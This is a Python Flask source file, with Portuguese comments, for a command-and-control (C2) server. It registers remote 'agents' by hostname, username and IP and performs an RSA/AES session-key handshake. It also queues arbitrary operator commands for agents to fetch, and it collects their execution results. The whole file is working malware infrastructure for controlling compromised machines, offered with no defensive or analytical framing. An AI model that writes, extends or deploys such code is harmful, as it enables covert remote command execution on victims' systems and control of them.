#!/usr/bin/env python3
# c2/server.py - Servidor C2 principal

from flask import Flask, request, jsonify
from flask_cors import CORS
from database import Database
from crypto import CryptoManager
import uuid
import logging
from datetime import datetime

# ============================================
# CONFIGURAÇÕES DIRETAS NO CÓDIGO
# ============================================
C2_HOST = "0.0.0.0"
C2_PORT = 5000
WEB_HOST = "0.0.0.0"
WEB_PORT = 5001

# ============================================
app = Flask(__name__)
CORS(app)

# Inicializa módulos
db = Database()
crypto = CryptoManager()
crypto.generate_rsa_keys()

# Cache de chaves de sessão
session_keys = {}

# Configura logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# ENDPOINTS DO C2
# ============================================

@app.route('/register', methods=['POST'])
def register_agent():
    """Registra novo agente e envia chave pública RSA"""
    try:
        data = request.json
        agent_id = data.get('agent_id', str(uuid.uuid4()))
        hostname = data.get('hostname')
        username = data.get('username')
        ip = request.remote_addr
        
        # Registra no banco
        db.register_agent(agent_id, hostname, ip, username)
        
        # Pega chave pública RSA
        public_key = crypto.get_public_key_pem()
        
        logger.info(f"✅ Novo agente: {hostname} ({ip}) - ID: {agent_id[:8]}")
        
        return jsonify({
            'status': 'registered',
            'agent_id': agent_id,
            'public_key': public_key
        })
    except Exception as e:
        logger.error(f"Erro no registro: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/exchange_key', methods=['POST'])
def exchange_key():
    """Handshake criptográfico - recebe chave AES criptografada com RSA"""
    try:
        data = request.json
        agent_id = data['agent_id']
        encrypted_key = data['session_key']
        
        # Descriptografa chave de sessão
        session_key = crypto.decrypt_session_key(encrypted_key)
        session_keys[agent_id] = session_key
        
        db.update_heartbeat(agent_id)
        
        logger.info(f"🔐 Handshake completo com {agent_id[:8]}")
        
        return jsonify({'status': 'key_exchanged'})
    except Exception as e:
        logger.error(f"Erro no handshake: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/tasks', methods=['GET'])
def get_tasks():
    """Agente busca comandos pendentes"""
    try:
        agent_id = request.args.get('agent_id')
        
        if not agent_id:
            return jsonify({'tasks': []})
        
        # Atualiza heartbeat
        db.update_heartbeat(agent_id)
        
        # Pega tarefas pendentes
        tasks = db.get_pending_tasks(agent_id)
        
        return jsonify({'tasks': tasks})
    except Exception as e:
        logger.error(f"Erro em tasks: {e}")
        return jsonify({'tasks': []})

@app.route('/results', methods=['POST'])
def receive_results():
    """Recebe resultados dos comandos executados"""
    try:
        data = request.json
        agent_id = data['agent_id']
        task_id = data['task_id']
        result = data['result']
        
        db.update_task_result(task_id, result)
        
        logger.info(f"📝 Resultado recebido - Task {task_id}")
        
        return jsonify({'status': 'received'})
    except Exception as e:
        logger.error(f"Erro em results: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/agents', methods=['GET'])
def list_agents():
    """Lista todos os agentes (para o dashboard)"""
    agents = db.get_all_agents()
    return jsonify(agents)

@app.route('/agents/<agent_id>/tasks', methods=['GET'])
def get_agent_tasks(agent_id):
    """Histórico de tarefas de um agente"""
    tasks = db.get_agent_tasks(agent_id)
    return jsonify(tasks)

@app.route('/send_command', methods=['POST'])
def send_command():
    """Envia comando para um agente"""
    try:
        data = request.json
        agent_id = data['agent_id']
        command = data['command']
        
        task_id = db.add_task(agent_id, command)
        
        logger.info(f"💀 Comando enviado para {agent_id[:8]}: {command[:50]}")
        
        return jsonify({
            'status': 'queued',
            'task_id': task_id
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════╗
    ║     🎯 C2 SERVER INITIALIZED 🎯       ║
    ╠═══════════════════════════════════════╣
    ║  API: http://0.0.0.0:5000            ║
    ║  Dashboard: http://0.0.0.0:5001      ║
    ╚═══════════════════════════════════════╝
    """)
    app.run(host=C2_HOST, port=C2_PORT, debug=False, threaded=True)